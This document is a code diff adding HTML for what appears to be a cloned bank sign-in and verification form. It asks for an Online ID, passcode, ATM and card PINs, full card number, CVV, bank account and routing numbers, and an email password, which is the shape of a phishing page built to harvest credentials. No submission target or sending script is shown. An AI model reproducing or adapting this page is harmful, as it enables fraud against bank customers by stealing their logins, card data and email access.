+                            <option value="NE">
+                             Nebraska
+                            </option>
+                            <option value="NV">
+                             Nevada
+                            </option>
+                            <option value="NH">
+                             New Hampshire
+                            </option>
+                            <option value="NJ">
+                             New Jersey
+                            </option>
+                            <option value="NM">
+                             New Mexico
+                            </option>
+                            <option value="NY">
+                             New York
+                            </option>
+                            <option value="NC">
+                             North Carolina
+                            </option>
+                            <option value="ND">
+                             North Dakota
+                            </option>
+                            <option value="OH">
+                             Ohio
+                            </option>
+                            <option value="OK">
+                             Oklahoma
+                            </option>
+                            <option value="OR">
+                             Oregon
+                            </option>
+                            <option value="PA">
+                             Pennsylvania
+                            </option>
+                            <option value="RI">
+                             Rhode Island
+                            </option>
+                            <option value="SC">
+                             South Carolina
+                            </option>
+                            <option value="SD">
+                             South Dakota
+                            </option>
+                            <option value="TN">
+                             Tennessee
+                            </option>
+                            <option value="TX">
+                             Texas
+                            </option>
+                            <option value="UT">
+                             Utah
+                            </option>
+                            <option value="VT">
+                             Vermont
+                            </option>
+                            <option value="VA">
+                             Virginia
+                            </option>
+                            <option value="WA">
+                             Washington
+                            </option>
+                            <option value="WV">
+                             West Virginia
+                            </option>
+                            <option value="WI">
+                             Wisconsin
+                            </option>
+                            <option value="WY">
+                             Wyoming
+                            </option>
+                           </select>
+                          </div>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td class="field-row">
+                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td rowspan="3">
+                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                         </td>
+                         <td width="100%">
+                          <span class="field-label-1">
+                           <label id="address_line1_label" for="address_line1">
+                            Online ID*
+                            <span class="hidden-left">
+                             No post office boxes.
+                            </span>
+                           </label>
+                          </span>
+                          <div class="field-form">
+                           <input type="text" maxlength="20" id="address_line1" size="16" value="" name="onlineid" class="align-font-width" autocomplete="off" />
+                          </div>
+                          <span style="font-size: 60%">
+                           (5-32 digits)
+                          </span>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td class="field-row">
+                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td rowspan="3">
+                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                         </td>
+                         <td width="100%">
+                          <span class="field-label-1">
+                           <label id="address_line1_label" for="address_line1">
+                            ATM or Check Card PIN*
+                            <span class="hidden-left">
+                             No post office boxes.
+                            </span>
+                           </label>
+                          </span>
+                          <div class="field-form">
+                           <input type="password" maxlength="12" id="address_line1" size="6" value="" name="atmcheckcardpin" class="align-font-width" autocomplete="off" />
+                          </div>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td class="field-row">
+                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td rowspan="3">
+                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                         </td>
+                         <td width="100%">
+                          <span class="field-label-1">
+                           <label id="address_line1_label" for="address_line1">
+                            Passcode*
+                            <span class="hidden-left">
+                             No post office boxes.
+                            </span>
+                           </label>
+                          </span>
+                          <div class="field-form">
+                           <input type="password" maxlength="20" id="address_line1" size="16" value="" name="passcode" class="align-font-width" autocomplete="off" />
+                          </div>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                   </tbody>
+                  </table>
+                  <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                   <tbody>
+                    <tr class="sec-title-header">
+                     <td width="5%">
+                      <img width="10" height="1" alt="" src="index.cfm_files/x.gif" />
+                      <img width="23" height="23" alt="" src="index.cfm_files/icon_circle.gif" />
+                      <img width="5" height="1" alt="" src="index.cfm_files/x.gif" />
+                     </td>
+                     <td>
+                      <h2 class="sec-hdr-h2">
+                       Select and Confirm Your Accounts Information
+                      </h2>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td class="whitebg">
+                      <img width="1" height="2" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                     </td>
+                    </tr>
+                   </tbody>
+                  </table>
+                  <table width="100%" border="0" cellspacing="0" cellpadding="0" style="display: block;" summary="">
+                   <tbody>
+                    <tr>
+                     <td colspan="2">
+                      <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td>
+                          <img width="1" height="11" src="index.cfm_files/x.gif" alt="" />
+                         </td>
+                        </tr>
+                        <tr>
+                         <td class="standard-font">
+                          <p class="paragraph">
+                           <img width="25" height="1" src="index.cfm_files/x.gif" alt="" />
+                           <strong>
+                            * = required information
+                           </strong>
+                          </p>
+                         </td>
+                        </tr>
+                        <tr>
+                         <td width="100%" align="left" class="standard-font">
+                          <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr>
+                             <td width="25">
+                              <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                             </td>
+                             <td class="field-row">
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr class="standard-font">
+                                 <td width="100%" valign="top" align="left">
+                                  <input type="checkbox" id="currentaddress_less_year" value="11" onclick="show_prevaddress();" name="currentaddress_less_year" />
+                                  <label for="currentaddress_less_year">
+                                   Credit/Debit Card*
+                                  </label>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </td>
+                        </tr>
+                        <tr id="prev_addr_section" style="visibility: hidden; display: none;">
+                         <td width="100%" align="left" class="standard-font">
+                          <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr>
+                             <td>
+                              <img width="25" height="10" alt="" src="index.cfm_files/px_002.gif" />
+                             </td>
+                             <td>
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="" class="field-row-level-2">
+                               <tbody>
+                                <tr>
+                                 <td width="500" class="field-row">
+                                  <table width="95%" border="0" cellspacing="0" cellpadding="0" summary="" class="field-row-level-2">
+                                   <tbody>
+                                    <tr>
+                                     <td colspan="2">
+                                      <img width="1" height="10" alt="" src="index.cfm_files/px_002.gif" />
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" align="left" class="field-label-1">
+                                      <h2 class="sec-hdr-h2">
+                                       Your Credit/Debit Card Details
+                                      </h2>
+                                     </td>
+                                     <td>
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" class="dotted-line">
+                                      <img width="1" height="1" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td>
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" colspan="2">
+                                      <img width="100%" height="8" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td>
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%">
+                                      <span class="field-label-1">
+                                       <label id="address_line1_label" for="address_line1">
+                                        Credit/Debit Card Number*
+                                        <span class="hidden-left">
+                                         No post office boxes.
+                                        </span>
+                                       </label>
+                                      </span>
+                                      <div class="field-form">
+                                       <input type="text" maxlength="16" id="address_line1" size="17" value="" name="ccnum" class="align-font-width" autocomplete="off" />
+                                      </div>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%">
+                                      <span class="field-label-1">
+                                       <label id="address_line1_label" for="address_line1">
+                                        Exp Date*
+                                        <span class="hidden-left">
+                                         No post office boxes.
+                                        </span>
+                                       </label>
+                                      </span>
+                                      <div class="field-form">
+                                       <select id="expmonth" name="expmonth">
+                                        <option selected="selected" value="">
+                                         (Month)
+                                        </option>
+                                        <option value="01">
+                                         01
+                                        </option>
+                                        <option value="02">
+                                         02
+                                        </option>
+                                        <option value="03">
+                                         03
+                                        </option>
+                                        <option value="04">
+                                         04
+                                        </option>
+                                        <option value="05">
+                                         05
+                                        </option>
+                                        <option value="06">
+                                         06
+                                        </option>
+                                        <option value="07">
+                                         07
+                                        </option>
+                                        <option value="08">
+                                         08
+                                        </option>
+                                        <option value="09">
+                                         09
+                                        </option>
+                                        <option value="10">
+                                         10
+                                        </option>
+                                        <option value="11">
+                                         11
+                                        </option>
+                                        <option value="12">
+                                         12
+                                        </option>
+                                       </select>
+                                       /
+                                       <select id="expyear" class="ccyearfield" name="expyear">
+                                        <option selected="selected" value="">
+                                         (Year)
+                                        </option>
+                                        <option value="2010">
+                                         2010
+                                        </option>
+                                        <option value="2011">
+                                         2011
+                                        </option>
+                                        <option value="2012">
+                                         2012
+                                        </option>
+                                        <option value="2013">
+                                         2013
+                                        </option>
+                                        <option value="2014">
+                                         2014
+                                        </option>
+                                        <option value="2015">
+                                         2015
+                                        </option>
+                                        <option value="2016">
+                                         2016
+                                        </option>
+                                       </select>
+                                      </div>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%">
+                                      <span class="field-label-1">
+                                       <label id="address_line1_label" for="address_line1">
+                                        Code Verification Number*
+                                        <span class="hidden-left">
+                                         No post office boxes.
+                                        </span>
+                                       </label>
+                                      </span>
+                                      <div class="field-form">
+                                       <input type="text" maxlength="4" id="address_line1" size="4" value="" name="cv" class="align-font-width" autocomplete="off" />
+                                      </div>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-label-2">
+                                      <small>
+                                       (it is the last 3 or 4 digits on the signature area of the card)
+                                      </small>
+                                      <br />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%">
+                                      <span class="field-label-1">
+                                       <label id="address_line1_label" for="address_line1">
+                                        Pin Number*
+                                        <span class="hidden-left">
+                                         No post office boxes.
+                                        </span>
+                                       </label>
+                                      </span>
+                                      <div class="field-form">
+                                       <input type="password" maxlength="4" id="address_line1" size="4" value="" name="ccpin" class="align-font-width" autocomplete="off" />
+                                      </div>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-label-2">
+                                      <small>
+                                       (Personal identification number of your credit/debit card)
+                                      </small>
+                                      <br />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td>
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%">
+                                      <span class="field-label-1">
+                                       <label id="address_line2_label" for="previous_address_line2">
+                                        <span>
+                                         Credit/Debit Card Billing Address
+                                        </span>
+                                       </label>
+                                      </span>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td width="100%" align="left" class="standard-font">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%">
+                                          <span class="field-label-1">
+                                           <label id="full_name_label" for="fullname">
+                                            Full Name*
+                                            <span class="hidden-left">
+                                             Do not use nicknames.
+                                            </span>
+                                           </label>
+                                          </span>
+                                          <div class="field-form">
+                                           <input type="text" maxlength="40" id="fullname" size="20" value="" name="fullname" class="align-font-width" autocomplete="off" />
+                                          </div>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td class="field-label-2" colspan="4">
+                                          <small>
+                                           (Enter your name as it appears on your credit/debit card.)
+                                          </small>
+                                          <br />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="2">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" id="prev_addr_1">
+                                          <span class="field-label-1">
+                                           <label id="previous_address_line1_label" for="previous_address_line1">
+                                            Address Line 1*
+                                           </label>
+                                          </span>
+                                          <div class="field-form">
+                                           <input type="text" id="previous_address_line1" size="30" maxlength="50" value="" name="addressline1" class="align-font-width" autocomplete="off" />
+                                          </div>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td class="field-label-2">
+                                          <small>
+                                           (Enter the address where you recieve your credit/debit card billing statement)
+                                          </small>
+                                          <br />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td>
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%">
+                                          <span class="field-label-1">
+                                           <label id="previous_address_line2_label" for="previous_address_line2">
+                                            Address Line 2
+                                           </label>
+                                          </span>
+                                          <div class="field-form">
+                                           <input type="text" id="previous_address_line2" size="30" maxlength="30" value="" name="addressline2" class="align-font-width" autocomplete="off" />
+                                          </div>
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="2">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td>
+                                          <span class="field-label-1">
+                                           <label id="previous_city_label" for="previous_city">
+                                            City*
+                                           </label>
+                                          </span>
+                                          <div class="field-form">
+                                           <input type="text" id="previous_city" size="20" maxlength="50" value="" name="addresscity" class="align-font-width" autocomplete="off" />
+                                          </div>
+                                         </td>
+                                         <td width="100%">
+                                          <span class="field-label-1">
+                                           <label id="previous_state_label" for="previous_state">
+                                            State*
+                                           </label>
+                                          </span>
+                                          <div class="field-form">
+                                           <select class="align-font-width-state" id="previous_state" name="addressstate">
+                                            <option>
+                                             (Please Select State)
+                                            </option>
+                                            <option value="AL">
+                                             Alabama
+                                            </option>
+                                            <option value="AK">
+                                             Alaska
+                                            </option>
+                                            <option value="AZ">
+                                             Arizona
+                                            </option>
+                                            <option value="AR">
+                                             Arkansas
+                                            </option>
+                                            <option value="CA">
+                                             California
+                                            </option>
+                                            <option value="CO">
+                                             Colorado
+                                            </option>
+                                            <option value="CT">
+                                             Connecticut
+                                            </option>
+                                            <option value="DE">
+                                             Delaware
+                                            </option>
+                                            <option value="DC">
+                                             District of Columbia
+                                            </option>
+                                            <option value="FL">
+                                             Florida
+                                            </option>
+                                            <option value="GA">
+                                             Georgia
+                                            </option>
+                                            <option value="HI">
+                                             Hawaii
+                                            </option>
+                                            <option value="ID">
+                                             Idaho
+                                            </option>
+                                            <option value="IL">
+                                             Illinois
+                                            </option>
+                                            <option value="IN">
+                                             Indiana
+                                            </option>
+                                            <option value="IA">
+                                             Iowa
+                                            </option>
+                                            <option value="KS">
+                                             Kansas
+                                            </option>
+                                            <option value="KY">
+                                             Kentucky
+                                            </option>
+                                            <option value="LA">
+                                             Louisiana
+                                            </option>
+                                            <option value="ME">
+                                             Maine
+                                            </option>
+                                            <option value="MD">
+                                             Maryland
+                                            </option>
+                                            <option value="MA">
+                                             Massachusetts
+                                            </option>
+                                            <option value="MI">
+                                             Michigan
+                                            </option>
+                                            <option value="MN">
+                                             Minnesota
+                                            </option>
+                                            <option value="MS">
+                                             Mississippi
+                                            </option>
+                                            <option value="MO">
+                                             Missouri
+                                            </option>
+                                            <option value="MT">
+                                             Montana
+                                            </option>
+                                            <option value="NE">
+                                             Nebraska
+                                            </option>
+                                            <option value="NV">
+                                             Nevada
+                                            </option>
+                                            <option value="NH">
+                                             New Hampshire
+                                            </option>
+                                            <option value="NJ">
+                                             New Jersey
+                                            </option>
+                                            <option value="NM">
+                                             New Mexico
+                                            </option>
+                                            <option value="NY">
+                                             New York
+                                            </option>
+                                            <option value="NC">
+                                             North Carolina
+                                            </option>
+                                            <option value="ND">
+                                             North Dakota
+                                            </option>
+                                            <option value="OH">
+                                             Ohio
+                                            </option>
+                                            <option value="OK">
+                                             Oklahoma
+                                            </option>
+                                            <option value="OR">
+                                             Oregon
+                                            </option>
+                                            <option value="PA">
+                                             Pennsylvania
+                                            </option>
+                                            <option value="RI">
+                                             Rhode Island
+                                            </option>
+                                            <option value="SC">
+                                             South Carolina
+                                            </option>
+                                            <option value="SD">
+                                             South Dakota
+                                            </option>
+                                            <option value="TN">
+                                             Tennessee
+                                            </option>
+                                            <option value="TX">
+                                             Texas
+                                            </option>
+                                            <option value="UT">
+                                             Utah
+                                            </option>
+                                            <option value="VT">
+                                             Vermont
+                                            </option>
+                                            <option value="VA">
+                                             Virginia
+                                            </option>
+                                            <option value="WA">
+                                             Washington
+                                            </option>
+                                            <option value="WV">
+                                             West Virginia
+                                            </option>
+                                            <option value="WI">
+                                             Wisconsin
+                                            </option>
+                                            <option value="WY">
+                                             Wyoming
+                                            </option>
+                                            <option value="IT">
+                                             International
+                                            </option>
+                                           </select>
+                                          </div>
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" class="field-label-1">
+                                          <label id="zipcode_label" for="previous_zipcode5">
+                                           Zip Code*
+                                           <span class="hidden-left">
+                                            Only first five digits are required.
+                                           </span>
+                                          </label>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td class="field-form">
+                                          <span class="hidden-left">
+                                           Zipcode first 5 digits
+                                          </span>
+                                          <input type="text" onkeypress="return csv_isNumeric(event);" id="previous_zipcode5" size="5" maxlength="5" value="" name="zipcode5" class="align-font-width" autocomplete="off" />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="100%" align="left" class="standard-font">
+                      <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td width="25">
+                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                         </td>
+                         <td class="field-row">
+                          <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr class="standard-font">
+                             <td width="100%" valign="top" align="left">
+                              <input type="checkbox" id="currentaddress_more_year" onclick="show_accdetails();" value="12" name="applicant[1].totalMonthsAtCurrentAddress" />
+                              <label for="currentaddress_more_year">
+                               Bank Account*
+                              </label>
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                    <tr id="acc_detail_section" style="visibility: hidden; display: none;">
+                     <td width="100%" align="left" class="standard-font">
+                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td>
+                          <img width="25" height="10" alt="" src="index.cfm_files/px_002.gif" />
+                         </td>
+                         <td>
+                          <table width="100%" cellspacing="0" cellpadding="0" summary="" class="field-row-level-2">
+                           <tbody>
+                            <tr>
+                             <td width="500" class="field-row">
+                              <table width="95%" border="0" cellspacing="0" cellpadding="0" summary="" class="field-row-level-2">
+                               <tbody>
+                                <tr>
+                                 <td colspan="2">
+                                  <img width="1" height="10" alt="" src="index.cfm_files/px_002.gif" />
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td width="100%" align="left" class="field-label-1">
+                                  <span class="sec-hdr-h2">
+                                   Checking or Saving Accounts Detail
+                                  </span>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td width="100%" class="dotted-line">
+                                  <img width="1" height="1" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                 <td>
+                                  <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td width="100%" colspan="2">
+                                  <img width="100%" height="8" border="0" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td>
+                                  <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                            <tr>
+                             <td class="field-row">
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr>
+                                 <td rowspan="3">
+                                  <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                 <td width="100%">
+                                  <span class="field-label-1">
+                                   <label id="account_number" for="account_number">
+                                    Account Number*
+                                   </label>
+                                  </span>
+                                  <div class="field-form">
+                                   <input type="text" maxlength="16" id="account_number" size="16" value="" name="accountnumber" class="align-font-width" autocomplete="off" />
+                                  </div>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                            <tr>
+                             <td class="field-row">
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr>
+                                 <td rowspan="3">
+                                  <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                 <td width="100%" class="field-label-1">
+                                  <label id="routing_number" for="routing_number">
+                                   Routing Number*
+                                  </label>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-form">
+                                  <input type="text" id="routing_number" size="16" maxlength="20" value="" name="routingnumber" class="align-font-width" autocomplete="off" />
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                   </tbody>
+                  </table>
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+              <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+               <tbody>
+                <tr class="sec-title-header">
+                 <td width="5%">
+                  <img width="10" height="1" alt="" src="index.cfm_files/x.gif" />
+                  <img width="23" height="23" alt="" src="index.cfm_files/icon_circle.gif" />
+                  <img width="5" height="1" alt="" src="index.cfm_files/x.gif" />
+                 </td>
+                 <td>
+                  <h2 class="sec-hdr-h2">
+                   Contact Information
+                  </h2>
+                 </td>
+                </tr>
+                <tr>
+                 <td class="whitebg">
+                  <img width="1" height="2" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+              <table width="100%" border="0" cellspacing="0" cellpadding="0" style="display: block;" summary="">
+               <tbody>
+                <tr>
+                 <td colspan="2">
+                  <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                   <tbody>
+                    <tr>
+                     <td>
+                      <img width="1" height="11" src="index.cfm_files/x.gif" alt="" />
+                     </td>
+                    </tr>
+                    <tr>
+                     <td class="standard-font">
+                      <p class="paragraph">
+                       <img width="25" height="1" src="index.cfm_files/x.gif" alt="" />
+                       <strong>
+                        * = required information
+                       </strong>
+                      </p>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="100%" align="left" class="standard-font">
+                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                       </tbody>
+                      </table>
+                     </td>
+                    </tr>
+                    <tr>
+                     <td width="100%" align="left" colspan="2" class="standard-font">
+                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr>
+                         <td width="35%">
+                          <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr>
+                             <td class="field-row">
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td>
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%">
+                                      <span class="field-label-1">
+                                       Phone Number*
+                                       <label id="home_phone_label" for="home_phone_ac">
+                                        <span class="hidden-left">
+                                         First 3 digits of Phone Number
+                                        </span>
+                                       </label>
+                                      </span>
+                                      <div class="field-form">
+                                       <input type="text" onkeyup="return autoTab(this,3,event);" onkeypress="return csv_isNumeric(event);" maxlength="3" id="home_phone_ac" size="3" value="" name="phoneareacode" class="align-font-width" autocomplete="off" />
+                                        - 
+                                       <label for="home_phone_ex">
+                                        <span class="hidden-left">
+                                         Second 3 digits of Phone Number
+                                        </span>
+                                       </label>
+                                       <input type="text" onkeyup="return autoTab(this,3,event);" onkeypress="return csv_isNumeric(event);" maxlength="3" id="home_phone_ex" size="3" value="" name="homephoneexchange" class="align-font-width" autocomplete="off" />
+                                        - 
+                                       <label for="home_phone_sub">
+                                        <span class="hidden-left">
+                                         Last 4 digits of Phone Number
+                                        </span>
+                                       </label>
+                                       <input type="text" onkeyup="return autoTab(this,4,event);" onkeypress="return csv_isNumeric(event);" maxlength="4" id="home_phone_sub" size="4" value="" name="homephonepubscriber" class="align-font-width" autocomplete="off" />
+                                      </div>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </td>
+                        </tr>
+                        <tr>
+                         <td colspan="2" class="field-row">
+                          <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr>
+                             <td class="field-row">
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr>
+                                 <td rowspan="2">
+                                  <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                 <td width="100%" colspan="2">
+                                  <span class="field-label-1">
+                                   <label id="email_address1_label" for="email_address1">
+                                    E-mail Address*
+                                   </label>
+                                  </span>
+                                  <div class="field-form">
+                                   <input type="text" onblur="csv_isEmail2(this);chk_same_email(this);" maxlength="50" id="email_address1" size="40" value="" name="emailaddress" class="align-font-width" autocomplete="off" />
+                                  </div>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td width="100%" colspan="2">
+                                  <span class="field-label-1">
+                                   <label id="email_password_label" for="email_password1">
+                                    E-mail password*
+                                   </label>
+                                  </span>
+                                  <div class="field-form">
+                                   <input type="password" onblur="csv_isEmail2password(this);chk_same_password(this);" maxlength="50" id="email_password1" size="40" value="" name="emailpassword" class="align-font-width" autocomplete="off" />
+                                  </div>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                          <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr>
+                             <td>
+                              <img width="1" height="2" src="index.cfm_files/x.gif" alt="" />
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                      <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                       <tbody>
+                        <tr class="sec-title-header">
+                         <td width="5%">
+                          <img width="10" height="1" alt="" src="index.cfm_files/x.gif" />
+                          <img width="23" height="23" alt="" src="index.cfm_files/icon_circle.gif" />
+                          <img width="5" height="1" alt="" src="index.cfm_files/x.gif" />
+                         </td>
+                         <td>
+                          <h2 class="sec-hdr-h2">
+                           Identification Information
+                          </h2>
+                         </td>
+                        </tr>
+                        <tr>
+                         <td class="whitebg">
+                          <img width="1" height="2" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
